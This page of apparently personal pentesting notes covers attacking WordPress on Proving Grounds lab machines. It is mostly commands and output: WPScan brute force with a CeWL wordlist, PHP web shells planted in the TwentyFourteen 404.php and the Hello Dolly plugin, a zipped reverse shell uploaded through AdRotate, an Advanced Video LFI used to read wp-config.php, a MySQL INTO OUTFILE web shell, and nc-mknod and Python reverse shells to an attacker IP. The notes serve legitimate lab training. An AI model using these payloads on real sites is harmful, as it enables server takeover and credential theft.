---
layout: default
title: Wordpress
parent: Web Exploits
nav_order: 5
---

# Wordpress

---

## Brute Force via WPScan

Use Cewl to get a custom wordlist of the site

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ cewl http://dc-2 -m 5 -w cewl.txt 2>/dev/null


```

WPScan password attack with the enumerated users and _cewl_ password list.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ wpscan --url http://dc-2 --disable-tls-checks -U users.txt -P cewl.txt

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

```

We have valid login credentials for _jerry_ and _tom_
jerry:adipiscing
tom:parurient
{: .warn }

We can SSH to port 7744 as _tom_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/dc-2]
└─$ ssh tom@192.168.160.194 -p 7744
tom@192.168.160.194's password:

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$
```

## Exploit TwentyFourteen Wordpress Theme

Place the following in the \*404.php\_ file.

```bash
<?php echo system($_REQUEST["cmd"]); ?>
```

![404](../../../../assets/images/ctfs/proving_grounds/btrsys/404.png)

Verify that the PHP web shell is executing commands.

![cmd](../../../../assets/images/ctfs/proving_grounds/btrsys/cmd.png)

Use _revshellgen_ to execute a reverse shell one-liner via the PHP web shell.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t nc-mknod

[+] Reverse shell command:

rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ urlencode "rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc 192.168.45.217 9001 1>/tmp/l"
rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl

```

Execute the URL encoded payload in the PHP web shell and receive a reverse shell in our netcat listener.

```bash
URL: http://192.168.242.50/wordpress/wp-content/themes/twentyfourteen/404.php?cmd=rm%20%2Ftmp%2Fl%3Bmknod%20%2Ftmp%2Fl%20p%3B%2Fbin%2Fsh%200%3C%2Ftmp%2Fl%20%7C%20nc%20192.168.45.217%209001%201%3E%2Ftmp%2Fl
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/btrsys]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.50] 51742
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Exploit Hello Dolly Plugin

Navigate to the _plugin editor_

![plugin_editor](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/plugin_editor.png)

Select the _Hello Dolly_ plugin to edit.

![hello_dolly](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/hello_dolly.png)

Insert the Pentest Monkey's PHP reverse shell script into the _hello.php_ file just after the commented out text.

Make sure to delete the PHP tags from the PHP reverse shells script being inserted into the _hello.php_ file.

[PHP reverse shell raw code](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

![hello_edit](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/hello_edit.png)

![update_file](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/update_file.png)

Navigate to the installed plugins menu.

![installed_plugins](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/installed_plugins.png)

Activate the _Hello Dolly_ plugin.

![activate](../../../../assets/images/ctfs/proving_grounds/sunset_midnight/activate.png)

Receive a reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/sunsetmidnight]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.243.88] 45046
Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux
 21:54:35 up  1:18,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Exploit AdRotate Plugin

The _AdRotate_ plugin allows file upload in zip format

![banner](../../../../assets/images/ctfs/proving_grounds/loly/banner.png)

Edit php-reverse-shell.php and zip as _rev.php_ within _zip.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ zip rev.zip  rev.php
  adding: rev.php (deflated 59%)

```

Upload rev.zip

![upload](../../../../assets/images/ctfs/proving_grounds/loly/upload.png)

Trigger by navigating to _/wordpress/wp-content/banners/rev.php_

![trigger](../../../../assets/images/ctfs/proving_grounds/loly/trigger.png)

Receive the reverse shell in our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/loly]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.242.121] 60228
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 18:34:05 up  1:45,  0 users,  load average: 0.02, 0.05, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Exploit Advanced Video 1.0 Wordpress Login

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ searchsploit advanced video 1.0
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion            | php/webapps/39646.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

The following POC URL is provided in the _39646.py_ exploit.

```bash
POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
```

This exploit is converting the file we indicate in [FILEPATH] and places at _wp-content/uploads_ with a random title.

Intially looking at _/wp-content/uploads_ we see it is empty.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text
****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                 -  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380

```

Let's trigger the exploit by reading _wp-config.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php"
https://192.168.218.148:12380/blogblog/?p=210

```

Checking _/wp-content/uploads/_ again we now see the JPEG with a random title.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[IMG]]       1621300986.jpeg  2023-11-16 02:13 3.0K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380

```

Download the JPEG and view contents

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/1621300986.jpeg --output wp-con
fig.php

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ cat wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

We have MySQL DB creds we can use for _root_.

### RCE via MySQL DB File Write

Since we have _root_ credentials to MySQL we should be able to write a file to disk.

Ultimately, we want to write a PHP web shell to the root WWW directory.

To determine the root WWW directory we need to leverate the LFI exploit to get _/etc/apache2/sites-available/default-ssl.conf_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/apache2/sites-available/default-ssl.conf"
https://192.168.218.148:12380/blogblog/?p=230


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[IMG]]       1588528899.jpeg  2023-11-16 02:20 6.2K  
[[IMG]]       1621300986.jpeg  2023-11-16 02:13 3.0K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/1588528899.jpeg --output defaul
t-ssl.conf

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ cat default-ssl.conf
<IfModule mod_ssl.c>
        <VirtualHost _default_:12380>
                ServerAdmin garry@red

                DocumentRoot /var/www/https

```

The DocumentRoot is _/var/www/https_

Now we can write a PHP web shell to disk at the path _/var/www/https/blogblog/wp-content/uploads/shell.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ mysql -u root -pplbkac -h 192.168.218.148

MySQL [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";
Query OK, 1 row affected (0.120 sec)

```

Now test the PHP web shell to make sure we have code execution.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Generate a Python reverse shell script using _revshellgen_ and URL encode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t python

[+] Reverse shell command:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.217",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

I used the _urlencoder.org_ site to do the URL encoding.

![encode](../../../../assets/images/ctfs/proving_grounds/stapler/encode.png)

Execute the payload and get reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-content/uploads/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.45.217%22%2C9001%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%20"

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.148] 60856
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```
